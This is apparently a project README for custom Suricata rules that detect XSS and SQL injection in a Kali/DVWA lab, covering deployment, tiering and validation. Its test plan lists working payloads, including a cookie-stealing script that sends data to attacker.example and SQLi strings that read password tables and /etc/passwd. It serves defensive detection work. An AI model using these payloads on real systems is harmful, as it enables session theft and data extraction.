# Custom Suricata Rules — XSS + SQLi Detection

Team-authored Suricata rules for XSS and SQL-injection detection. For this
project the Kali monitoring VM runs these **custom rules only** — the
Emerging Threats (ET) Open ruleset and Suricata's built-in protocol-anomaly
rules are disabled so the alert feed is scoped exactly to the two attack
classes the project targets (see *Deployment* below).

These files live in the repo for version control + reproducibility; they
must be installed into the Kali VM to take effect.

## Files

| File | Rules | SID range | Author |
|------|-------|-----------|--------|
| `xss_alerts.rules` | 58 | `1000001–1000058` | Shaina (`KAUR97`) |
| `sqli_alerts.rules` | 13 | `1000101–1000113` | Sahil (`Sahil-Tho`) |

Run `git log lab/suricata/<file>` for full authorship history. Both files
sit in the standard user-rule range (`1000000–1999999`), clear of the ET
Open reserved range (`2000000–2999999`).

## Priority tiers

Both rulesets use the same three-tier `priority:` scheme. Suricata maps
`priority:N` to `alert.severity`, which the AI module renders as:

| Tier | `priority:` | Dashboard severity |
|------|-------------|--------------------|
| P1 | 1 | **critical** |
| P2 | 2 | **high** |
| P3 | 3 | **low** |

(The dashboard has no "medium" — every custom alert lands in critical /
high / low by tier.)

### XSS — `xss_alerts.rules`

| Tier | Count | Behaviour matched |
|------|-------|--------------------|
| P1 | 39 | Confirmed exploit chains: `document.cookie` + exfiltration channel (`fetch`, `Image()`, `XMLHttpRequest`, `sendBeacon`, `WebSocket`, `postMessage`, `window.location`), or `<script>` paired with `document.cookie` / `eval()` / `document.write()` / remote `src=`, or obfuscation (`String.fromCharCode`, `atob`) + cookie access. |
| P2 | 12 | Encoded tag injection — script / iframe / marquee / details, in URI / POST body / headers. PCRE covers raw `<` and URL-encoded `%3C`. |
| P3 | 7 | Wide-net indicators — JS sink keywords (`eval(`, `innerHTML`, `document.write(`), raw HTML tags, event handlers (`onerror=`, `onload=`, `onmouseover=`, `onfocus=`). |

### SQLi — `sqli_alerts.rules`

| Tier | SIDs | Behaviour matched |
|------|------|--------------------|
| P1 | 1000101–1000104 | Confirmed exploit / extraction: `UNION SELECT` (URI + POST), DB function calls (`version()`, `database()`, `user()`, `schema()`), OS-command primitives (`xp_cmdshell`, `LOAD_FILE`, `INTO OUTFILE/DUMPFILE`). |
| P2 | 1000105–1000109 | Clear injection structure: boolean-blind (`OR 1=1`), time-blind (`SLEEP`, `WAITFOR DELAY`, `pg_sleep`, `BENCHMARK`), comment sequences (`--`, `#`, `/*`), `information_schema` enumeration. |
| P3 | 1000110–1000113 | Wide net: SQL keyword + quote combinations in URI / POST / headers, URL-encoded SQLi characters. |

## Deployment — install into the Kali monitoring VM (custom-only)

**Important**: take a VirtualBox snapshot of the Kali VM BEFORE deploying.
Suricata config changes can break the running IDS; the snapshot lets you
roll back.

```bash
# (Inside the Kali VM)

# 1. Find where Suricata looks for rule files on THIS install
sudo grep "default-rule-path" /etc/suricata/suricata.yaml
# Common values: /var/lib/suricata/rules  (recent Kali)

# 2. Copy both custom rule files into THAT directory
sudo cp /media/sf_soc-triage/p000774csitcp/lab/suricata/xss_alerts.rules \
        /media/sf_soc-triage/p000774csitcp/lab/suricata/sqli_alerts.rules \
        /var/lib/suricata/rules/

# 3. Make this a CUSTOM-ONLY ruleset.
sudo nano /etc/suricata/suricata.yaml
# Find the `rule-files:` block (search /^rule-files:) and set it to load
# ONLY the two custom files — comment out suricata.rules and any other
# entries so ET Open + built-in event rules do not load:
#
#   rule-files:
#     - xss_alerts.rules
#     - sqli_alerts.rules
#   # - suricata.rules        # ET Open — disabled for this project
```

> **Why disable ET Open?** ET Open also fires on SQLi/XSS (its
> `ET WEB_SERVER ...` signatures), so leaving it on would double-alert
> every attack alongside our rules and add unrelated `ET SCAN` /
> `SURICATA` protocol noise. Custom-only keeps the feed scoped to the
> project's two attack classes and makes every alert traceable to a rule
> we wrote. Trade-off: the internal Docker `ET SCAN mySQL 3306`
> false-positive example disappears — but the broad P2/P3 rules still
> over-match benign traffic, which is the false-positive stream the AI
> triage layer is meant to suppress.

```bash
# 4. Validate config + rules parse cleanly BEFORE restart
sudo suricata -T -c /etc/suricata/suricata.yaml
# Expect: "Configuration provided was successfully loaded. Exiting."
# If an error mentions xss_alerts.rules or sqli_alerts.rules, do NOT
# restart — fix first.

# 5. Reload (or restart) Suricata
sudo systemctl reload suricata || sudo systemctl restart suricata

# 6. Verify the expected rule count loaded (71 = 58 XSS + 13 SQLi)
sudo grep "rules loaded" /var/log/suricata/suricata.log | tail -1
```

## Signature ID conflict check

The two files must not share SIDs. XSS owns `1000001–1000058`; SQLi was
renumbered into `1000101–1000113` specifically to clear it (the original
draft used `1000001–1000013`, which collided with the XSS file, and also
shipped a `TEST ALERT` rule on `sid:1000001` that fired on every HTTP
packet — both removed during integration). Confirm no residual duplicates
after copying:

```bash
sudo grep -h "sid:" /var/lib/suricata/rules/*.rules \
    | grep -oP "sid:\K\d+" \
    | sort -n | uniq -d
```

Empty output = no duplicates. Any output = renumber before deploying.

## Validation test plan

Before relying on the rules in evaluation or live demo, hand-test each
tier against DVWA. Goal: rules fire on intended payloads AND stay quiet on
benign traffic. Monitor alerts live in a second Kali terminal:

```bash
sudo tail -f /var/log/suricata/eve.json \
    | jq 'select(.event_type=="alert") | {sid: .alert.signature_id, msg: .alert.signature}'
```

### XSS — target `/vulnerabilities/xss_r/`

```text
# P1 cookie exfiltration via fetch — fires sid 1000001/1000002
   <script>fetch('http://attacker.example/?c='+document.cookie)</script>
# P1 script + eval — fires sid 1000015-1000017
   <script>eval('alert(1)')</script>
# P2 URL-encoded script tag — fires sid 1000040
   %3Cscript%3Ealert(1)%3C%2Fscript%3E
# P3 img with onerror — fires sid 1000055 / 1000057
   <img src=x onerror=alert(1)>
```

### SQLi — target `/vulnerabilities/sqli/?id=<payload>&Submit=Submit`

```text
# P1 UNION SELECT in URI — fires sid 1000101
   1' UNION SELECT user, password FROM users#
# P1 DB function call — fires sid 1000103
   1' AND version()#
# P1 OS command primitive — fires sid 1000104
   1' UNION SELECT LOAD_FILE('/etc/passwd')#
# P2 boolean-blind — fires sid 1000105 (and 1000108 for the comment)
   1' OR 1=1#
# P2 time-blind — fires sid 1000106
   1' OR SLEEP(5)#
# P2 information_schema enumeration — fires sid 1000109 (and 1000101)
   1' UNION SELECT table_name,1 FROM information_schema.tables#
# P3 keyword + quote — fires sid 1000110
   1' SELECT 1
```

### Negative tests — must NOT fire

```text
# Benign DVWA SQLi page load with a numeric id
   /vulnerabilities/sqli/?id=1&Submit=Submit
# Routine XSS page load
   /vulnerabilities/xss_r/
# Plain text mentioning a keyword, no quote/structure
   /vulnerabilities/xss_r/?name=I+saw+a+javascript+book
```

> Note: P2 SQLi Rule 8 (`--`, `#`, `/*`) and P3 Rule 12 (URL-encoded
> chars) are deliberately broad and WILL occasionally fire on benign
> requests. Those over-matches are expected — they are the false-positive
> stream the AI triage layer classifies down to `likely_false_positive`.
> Record them; do not "fix" the rules to silence them unless a payload is
> genuinely unreachable.

For each test record: which SID fired (or didn't), any false matches,
any duplicates.

## Evaluation ablation

The live VM runs custom-only, but the evaluation harness (Phase 6) can
toggle rulesets independently per config to measure each contribution:

| Config | Ruleset | Measures |
|--------|---------|----------|
| baseline | ET Open only | reference recall |
| custom | XSS + SQLi custom only | recall vs baseline |
| both | ET Open + custom | overlap / double-alerting |

Recall delta between configs is the measured contribution of the custom
rules in the evaluation report.

## Known limitations

1. **Priority tier not yet used by the AI agent.** `extract_attack_type()`
   collapses all rules to `attack_type = "XSS"` / `"SQLi"` regardless of
   P1/P2/P3. The `priority:` field DOES set `alert.severity` (→ dashboard
   critical/high/low) and reaches the LLM via the prompt, but the
   rule-based suggestion generator does not yet branch on tier. Future
   work: urgent suggestions for P1 (invalidate sessions / rotate creds)
   vs audit/monitor for P3.

2. **No `metadata: mitre_technique_id`** on the custom rules. The
   MITRE-tactic override maps from `attack_type` instead, so this is not
   blocking — but adding the metadata field would make alerts
   self-describing.

3. **SQLi rules match `any any -> any any`.** Unlike the XSS rules
   (`$EXTERNAL_NET -> $HTTP_SERVERS`), the SQLi rules inspect all HTTP
   directions. Broader coverage, but more exposure to internal traffic
   matching the wide P2/P3 patterns. Tighten to `$EXTERNAL_NET ->
   $HTTP_SERVERS $HTTP_PORTS` if the lab needs a quieter feed.
